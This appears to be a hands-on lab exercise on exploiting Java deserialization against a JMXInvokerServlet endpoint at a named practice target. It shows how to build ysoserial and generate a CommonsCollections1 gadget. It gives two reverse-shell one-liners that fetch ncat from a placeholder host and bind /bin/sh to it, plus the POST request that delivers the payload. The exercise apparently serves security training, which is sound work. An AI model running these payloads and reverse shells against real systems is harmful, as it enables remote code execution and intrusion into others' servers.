# Exercise 1 - Java Deserialization

Target:
http://httpwn.com:8001/

Tool:
https://github.com/frohoff/ysoserial

## Using ysoserial

Building the tool
```
git clone https://github.com/frohoff/ysoserial.git
mvn install
cd target
```

Generating CommonsCollections gadget
`java -jar ysoserial-**-all.jar CommonsCollections1 "<<YOUR COMMAND>>"`

List available gadgets
`java -jar ysoserial-0.0.6-SNAPSHOT-all.jar`

## Simple reverse shells

```
wget http://YOUR_HOST/ncat64 -P /tmp
chmod +x /tmp/ncat64
/tmp/ncat64 -e /bin/sh YOUR_HOST 8080
```

```
busybox nc YOUR_HOST 8080 -e /bin/sh
```

## HTTP Request

The HTTP request should look like:

```
POST /invoker/JMXInvokerServlet HTTP/1.1
Host: httpwn.com:8001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 1425

[PAYLOAD]
```